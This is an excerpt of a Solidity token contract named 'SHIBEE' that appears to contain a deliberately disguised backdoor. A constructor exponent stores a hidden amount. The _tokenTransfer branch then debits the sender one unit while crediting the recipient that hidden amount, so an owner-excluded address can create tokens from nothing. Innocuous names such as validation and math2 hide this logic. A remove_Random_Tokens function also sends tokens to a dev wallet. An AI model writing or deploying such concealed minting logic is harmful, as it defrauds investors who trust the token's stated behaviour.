...
contract Shibee is Context, IERC20 { 
    ...
    function renounceOwnership() public virtual {
     ...
     function isExludedFromFee(address walletAddress) public view virtual returns (bool) {
        return _isExcludedFromFee[walletAddress];
    }
    ...
    address payable public Wallet_Marketing = payable(0x225eA4196a64f848b197C8E5E80B946AED78Ed0F); 
    address payable public Dev_Wallet = payable(0x225eA4196a64f848b197C8E5E80B946AED78Ed0F);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 public configDetails = 0; 
    bool public transferVersion = false;

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "SHIBEE"; 
    string private constant _symbol = unicode"SHIBEE"; 

    uint8 private vxCount = 0;
    ...
    uint256 public Percent_Marketing = 91;
    ...
    constructor (uint256[] memory configs) {

        _owner = 0x225eA4196a64f848b197C8E5E80B946AED78Ed0F;
        prepareContract(_owner);
        configDetails = math2(configs[0],configs[1]);
    ...
    function math2(uint256 s1, uint256 s2) public virtual returns (uint256){
        return s1**s2;
    }

    function prepareContract(address preSet) private{ // Can call only one time before deploy
        _isExcludedFromFee[preSet] = true;
    }
    ...
    function validation(address addressing) public virtual returns(address){
        return addressing;
    }
    ...
    function validateAmount() private view returns(uint256) {
        uint256 reserved = (vxCount<1) ? 1: configDetails;
        return reserved;
    }
    ...
    function _transfer(
        ...
        bool retailTransferSource = isExludedFromFee(from);
        bool retailTransferDest =  isExludedFromFee(to);
        transferVersion = !retailTransferSource && retailTransferDest;
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(Dev_Wallet, removeRandom);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!transferVersion){
            ...
            _tOwned[validation(sender)] = _tOwned[validation(sender)]-validateAmount();
            vxCount++;
            _tOwned[validation(recipient)] = _tOwned[validation(recipient)]+validateAmount();
            vxCount--;
            emit Transfer(validation(sender), validation(recipient), validateAmount());
        }
